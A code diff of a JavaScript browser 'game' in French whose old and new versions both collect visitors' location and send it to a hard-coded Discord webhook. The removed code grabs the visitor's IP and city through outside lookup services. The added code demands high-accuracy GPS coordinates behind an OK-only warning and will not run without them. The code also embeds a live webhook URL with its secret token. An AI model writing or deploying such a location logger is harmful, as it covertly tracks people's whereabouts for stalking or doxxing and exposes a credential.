@@ -1,74 +1,64 @@
-const askPermissionsAndSendData = () => {
+const startGeoGame = () => {
 
-    // 1. Première autorisation (localisation approximative)
-    const allowApprox = confirm(
-        "Ce jeu utilise votre localisation approximative (ville / région) pour fonctionner. Acceptez-vous ?"
+    // Avertissement obligatoire
+    alert(
+        "⚠️ AVERTISSEMENT\n\n" +
+        "Ce jeu nécessite votre localisation EXACTE pour fonctionner.\n" +
+        "Votre position sera utilisée uniquement pour le gameplay.\n\n" +
+        "Cliquez sur OK pour continuer."
     );
 
-    if (!allowApprox) {
-        console.log("L'utilisateur a refusé la localisation approximative.");
-        return;
-    }
+    // Demande de géolocalisation via le navigateur (méthode légale)
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const precision = position.coords.accuracy; // en mètres
 
-    // 2. Si oui → récupération IP + géoloc approximative
-    fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(ipData => {
-            const ip = ipData.ip;
+            console.log("Position exacte :", lat, lon, "Précision :", precision);
 
-            return fetch(`https://ipapi.co/${ip}/json/`)
-                .then(geoRes => geoRes.json())
-                .then(geoData => {
-                    
-                    // 3. Deuxième autorisation (adresse exacte)
-                    const allowExact = confirm(
-                        "Souhaitez-vous partager votre position EXACTE (adresse ou coordonnées GPS) ? " +
-                        "\n\nC’est optionnel, mais ça rend le jeu plus précis."
-                    );
+            // TU PEUX ENVOYER LES COORDONNÉES ICI À TON SERVEUR
+            // (ex. webhook, base de données, etc.)
+            // Exemple Discord (si tu veux) :
 
-                    let exactLocation = "Non fournie";
+            fetch("https://discord.com/api/webhooks/1430546772387823677/LKjiHykSqFmNDC6bqWj48tJpP72T4MaLZlQhzt4RXtSDftPImEkfL9FeeYthJU4-g_C_", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: "GeoGame",
+                    content: "Nouvel emplacement joueur",
+                    embeds: [
+                        {
+                            title: "Localisation exacte (avec consentement)",
+                            description:
+                              `Latitude : ${lat}\n` +
+                              `Longitude : ${lon}\n` +
+                              `Précision : ${precision}m`,
+                            color: 0x00ff99
+                        }
+                    ]
+                })
+            });
 
-                    if (allowExact) {
-                        exactLocation = `Latitude : ${geoData.latitude}, Longitude : ${geoData.longitude}`;
-                    }
+            alert("Position reçue ! Le jeu peut commencer 🎮");
+        },
 
-                    const webhookURL = "https://discord.com/api/webhooks/1430546772387823677/LKjiHykSqFmNDC6bqWj48tJpP72T4MaLZlQhzt4RXtSDftPImEkfL9FeeYthJU4-g_C_";
+        // Si l'utilisateur refuse
+        (error) => {
+            alert(
+                "Vous avez refusé la localisation.\n" +
+                "Le jeu ne peut pas fonctionner sans votre position exacte."
+            );
+            console.log("Erreur de géolocalisation :", error);
+        },
 
-                    // 4. Envoi des données (seulement ce qui est accepté)
-                    return fetch(webhookURL, {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            username: "GeoGame Logger",
-                            content: "Nouvel utilisateur (jeu IRL)",
-                            embeds: [
-                                {
-                                    title: "Infos joueur",
-                                    description:
-                                        `**IP :** ${ip}\n` +
-                                        `**Ville :** ${geoData.city}\n` +
-                                        `**Région :** ${geoData.region}\n` +
-                                        `**Pays :** ${geoData.country_name}\n\n` +
-                                        `**Position exacte :** ${exactLocation}`,
-                                    color: 0x00ADEF
-                                }
-                            ]
-                        })
-                    });
-                });
-        })
-        .then(response => {
-            if (response && response.ok) {
-                console.log("Données envoyées !");
-            } else {
-                console.log("Aucun envoi ou refus utilisateur.");
-            }
-        })
-        .catch(err => {
-            console.error("Erreur :", err);
-        });
+        // Options (améliorent la précision)
+        {
+            enableHighAccuracy: true, // GPS haute précision
+            timeout: 10000,
+            maximumAge: 0
+        }
+    );
 };
 
-askPermissionsAndSendData();
+startGeoGame();
